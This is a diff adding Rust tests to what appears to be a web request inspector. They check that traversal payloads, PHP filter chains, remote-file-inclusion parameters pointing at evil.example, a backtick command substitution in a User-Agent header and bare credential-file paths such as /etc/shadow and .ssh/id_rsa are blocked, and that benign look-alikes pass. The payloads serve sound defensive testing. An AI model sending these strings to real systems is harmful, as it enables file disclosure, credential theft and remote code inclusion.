@@ -231,3 +231,81 @@ fn user_agent_locale_tokens_are_not_commands() {
         assert!(ua(attack) >= BLOCK, "{attack}");
     }
 }
+
+/// Traversal disguised with encoded dots, double encoding, overlong UTF-8, look-alike
+/// characters or hex notation blocks; plain relative paths don't.
+#[test]
+fn disguised_traversal() {
+    let w = Inspector::new();
+    for attack in [
+        "%uff0e%uff0e/%uff0e%uff0e/etc/passwd",
+        "..%u2215..%u2215..%u2215etc%u2215passwd",
+        "0x2e0x2e0x2f0x2e0x2e0x2fetc0x2fpasswd",
+        "%2e%2e%2fconfig.php",
+        "..%252f..%252fconfig.php",
+        "%%32%65%%32%65/config.php",
+        "/%c0%ae%c0%ae/config.php",
+        "..&#x2f;..&#x2f;config.php",
+    ] {
+        assert!(value_score(&w, attack) >= BLOCK, "{attack}");
+    }
+    for benign in [
+        "../img/logo.png",
+        "../../assets/css/app.css",
+        "..%2Fimg%2Flogo.png", // a browser encodes the slashes of a form field, not the dots
+        "see ../README.md and ../../docs/",
+        "version 1.2.3..1.2.4",
+    ] {
+        assert!(value_score(&w, benign) < BLOCK, "{benign}");
+    }
+}
+
+/// PHP filter chains, RFI parameter names in any case, and command substitution in headers.
+#[test]
+fn php_filter_chain_rfi_names_and_header_substitution() {
+    let w = Inspector::new();
+    assert!(value_score(&w, "convert.iconv.UTF8.CSISO2022KR|convert.base64-decode") >= BLOCK);
+    assert!(value_score(&w, "convert.iconv.CP1390.CSIBM932") >= BLOCK);
+    let rfi = |target: &str| {
+        w.inspect(&HttpRequest {
+            path_and_query: target,
+            headers: &[],
+            content_type: None,
+            body: b"",
+        })
+        .max_score()
+    };
+    assert!(rfi("/x.php?_CONF[path]=https://evil.example/") >= BLOCK);
+    assert!(rfi("/x.php?mosConfig_absolute_path=https://evil.example/") >= BLOCK);
+    assert!(rfi("/x.php?path=https://example.com/docs") < BLOCK);
+    let ua = |v: &str| request_score(&w, &[("User-Agent", v)], None, b"");
+    assert!(ua("Mozilla/5.0`id`") >= BLOCK);
+    assert!(ua("Mozilla/5.0 (X11; Linux x86_64) Firefox/131.0") < BLOCK);
+}
+
+/// A value that is only the path of an OS file is a file-read attempt; the same path in
+/// a sentence is not.
+#[test]
+fn os_file_path_as_the_whole_value() {
+    let w = Inspector::new();
+    for attack in [
+        "/etc/passwd",
+        "/proc/self/environ",
+        ".ssh/id_rsa",
+        "c:\\boot.ini",
+        "/etc/shadow%00",
+        "file:///etc/hosts",
+    ] {
+        assert!(value_score(&w, attack) >= BLOCK, "{attack}");
+    }
+    for benign in [
+        "my key is in .ssh/id_rsa on the laptop", // the rule needs the whole value to be the path
+        "copy it to /home/anna/notes.txt",
+        "/products/42",
+        "/static/css/app.css",
+        "./build.sh",
+        "c:\\users\\anna\\documents\\cv.docx",
+    ] {
+        assert!(value_score(&w, benign) < BLOCK, "{benign}");
+    }
+}
